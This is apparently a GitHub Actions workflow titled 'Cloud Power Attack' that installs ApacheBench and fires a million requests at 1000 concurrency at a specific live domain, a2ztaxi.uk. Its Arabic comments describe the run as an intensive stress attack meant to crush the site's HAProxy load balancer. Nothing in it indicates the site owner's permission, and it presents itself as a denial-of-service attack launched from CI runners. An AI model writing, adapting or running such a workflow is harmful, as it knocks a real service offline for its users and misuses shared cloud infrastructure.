name: Cloud Power Attack
on: [workflow_dispatch]

jobs:
  attack_job:
    runs-on: ubuntu-latest
    steps:
      - name: Ultimate Cloud Attack
        run: |
          # تثبيت أداة قوية وصغيرة جداً
          sudo apt-get update && sudo apt-get install -y apache2-utils
          # تشغيل هجوم ضغط مكثف بـ 50000 طلب متزامن
          # هذا سيسحق الـ HAProxy إذا لم يكن محمياً بقوة
          ab -n 1000000 -c 1000 https://a2ztaxi.uk
